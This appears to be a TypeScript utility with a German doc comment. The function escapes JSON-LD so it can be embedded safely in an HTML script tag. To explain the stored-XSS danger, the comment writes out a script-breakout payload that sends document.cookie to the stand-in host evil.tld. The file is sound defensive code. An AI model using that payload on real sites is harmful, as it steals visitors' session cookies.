/**
 * JSON-LD sicher in ein <script>-Tag schreiben
 *
 * JSON.stringify allein reicht dafuer nicht. Es escaped `<` nicht, weil das in
 * JSON ein voellig normales Zeichen ist. In einem HTML-<script>-Block gilt aber
 * die HTML-Regel: Der Parser beendet das Skript beim ersten `</script`, egal
 * ob es mitten in einem String-Literal steht.
 *
 * Ein redaktionelles Feld mit
 *
 *     Sommerfest </script><script>fetch('https://evil.tld?c='+document.cookie)</script>
 *
 * bricht damit aus dem JSON-LD aus und wird als Skript ausgefuehrt — auf jeder
 * oeffentlichen Event-, Artikel- und Newsletter-Seite, fuer jeden Besucher. Weil
 * der Text aus der Datenbank kommt, ist das Stored XSS: einmal gespeichert,
 * wirkt es dauerhaft. Ein Editor mit Schreibrechten reicht dafuer aus.
 *
 * Die ersetzten Zeichen sind innerhalb eines JSON-String-Literals gueltige
 * Escapes, JSON.parse liefert also exakt denselben Wert zurueck. Suchmaschinen
 * lesen das JSON-LD unveraendert.
 *
 * U+2028 und U+2029 sind mit dabei: In JSON erlaubt, in JavaScript dagegen
 * Zeilenumbrueche — sie brechen sonst jeden Parser, der den Block als Skript liest.
 */
export function jsonLdScriptContent(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029')
}
